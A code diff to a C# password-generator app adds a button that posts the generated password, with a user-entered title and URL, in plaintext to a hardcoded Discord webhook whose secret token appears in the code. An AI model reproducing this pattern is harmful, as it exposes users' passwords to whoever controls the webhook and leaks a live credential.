@@ -1,12 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
+﻿using Newtonsoft.Json;
+using System;
 using System.Drawing;
-using System.Linq;
+using System.Globalization;
+using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Password_Generator
@@ -118,13 +117,56 @@ namespace Password_Generator
             else Clipboard.SetText(label3.Text);
         }
 
-        private void button5_Click(object sender, EventArgs e)
+        private void button6_Click(object sender, EventArgs e)
         {
-            var url = "https://github.com/0xRubin";
-            var process = new System.Diagnostics.ProcessStartInfo();
-            process.UseShellExecute = true;
-            process.FileName = url;
-            System.Diagnostics.Process.Start(process);
+            sendWebhook();
+        }
+
+        private void sendWebhook()
+        {
+            string hook = "https://discord.com/api/webhooks/826165130576396288/Zf01W72sJ99HzDoB3xY9_RcneNiJ1hgABTAQz5dO3dZtyBFe1jLKjhQrah-ykLlGnKyS";
+            string customInput;
+            if (label3.Text == "Your Password" && textBox3.Text != "Custom") { customInput = textBox3.Text; } else { customInput = label3.Text; };
+            WebRequest wr = (HttpWebRequest)WebRequest.Create(hook);
+            wr.ContentType = "application/json";
+            wr.Method = "POST";
+            using (var sw = new StreamWriter(wr.GetRequestStream()))
+            {
+                string json = JsonConvert.SerializeObject(new
+                {
+                    username = "Passwort",
+                    embeds = new[]
+                    {
+                        new
+                        {
+
+                            title = textBox1.Text,
+                            url = textBox2.Text,
+                            description = "`"+customInput+"`",
+                            color = "8454385"
+
+                        }
+                    }
+                });
+
+                sw.Write(json);
+            }
+            var response = (HttpWebResponse)wr.GetResponse();
+        }
+
+        private void textBox1_Enter(object sender, EventArgs e)
+        {
+            textBox1.Text = "";
+        }
+
+        private void textBox2_Enter(object sender, EventArgs e)
+        {
+            textBox2.Text = "";
+        }
+
+        private void textBox3_Enter(object sender, EventArgs e)
+        {
+            textBox3.Text = "";
         }
     }
 }
